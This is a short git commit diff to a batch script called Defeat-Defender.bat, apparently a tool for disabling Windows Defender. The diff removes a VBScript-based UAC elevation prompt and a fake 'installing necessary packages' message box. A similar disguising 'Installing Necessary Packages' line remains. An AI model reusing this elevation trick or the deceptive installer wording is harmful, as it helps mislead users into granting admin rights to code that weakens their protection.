5231461831d6752e0b7618453dae84afc7150c62
Jean-Baptiste Rouault <jbrouault@users.noreply.github.com>
2023-01-18 17:41:55 +0100

    Remove interactive graphical prompts

--- Defeat-Defender.bat
+++ Defeat-Defender.bat
@@ -8,23 +8,9 @@ REM  --> CheckING for permissions
 
 REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params = %*:"="
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
-echo msgbox "Please Wait While we install necessary packages for You!.Window will be closed after Installation!!!" > %tmp%\tmp.vbs
-wscript %tmp%\tmp.vbs
-del %tmp%\tmp.vbs
+    echo This script must be run as admin...
+    exit
+)
 
 echo  Installing Necessary Packages.....Please Wait.....
 
